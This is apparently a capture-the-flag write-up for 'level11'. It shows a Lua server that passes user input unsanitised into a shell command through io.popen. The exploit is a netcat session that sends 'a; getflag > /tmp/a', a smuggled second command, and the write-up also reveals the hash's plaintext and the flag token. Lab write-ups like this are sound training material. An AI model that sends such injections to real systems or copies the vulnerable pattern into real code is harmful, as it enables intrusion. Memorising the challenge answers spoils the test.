# level11

There is a lua script that creates a server on `127.0.0.1:5151`

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

The script itself does nothing, check if the sha1sum-ed input matches, \
But with a quick search [decrypt sha1sum](https://hashes.com/en/decrypt/hash), it just means `NotSoEasy`. \
The exploit is in `echo ...`

```bash
nc 127.0.0.1 5151
# Password: a; getflag > /tmp/a
# Erf nope..

cat /tmp/a
# Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
